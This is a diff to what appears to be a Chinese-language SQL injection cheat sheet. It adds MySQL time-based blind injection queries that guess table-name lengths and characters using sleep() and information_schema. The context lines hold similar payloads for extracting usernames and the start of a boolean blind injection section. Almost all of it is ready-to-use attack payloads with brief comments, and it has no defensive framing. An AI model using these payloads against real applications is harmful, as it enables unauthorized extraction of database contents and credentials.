@@ -25,6 +25,11 @@ and sleep(if((1=(select username from users)),1,4)) #猜解字段个数
 and sleep(if((ascii(substr((select username from users limit 0,1),1,1))),1,4)) #猜解长度
 and sleep(if((ascii(substr((select username from users limit 0,1),1,1))=101),1,4)) #获取字段内容
 
+补充
+select  * from users where id=1 and sleep(if(((select length(table_name) from information_schema.tables where table_schema=database())=5),1,4)); #猜接数据库名长度
+select  * from users where id=1 and sleep(if(((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)="u"),1,4)); #猜解表名
+
+
 mysql布尔盲注
 
 and (length(database())=1) # 猜数据库名长度
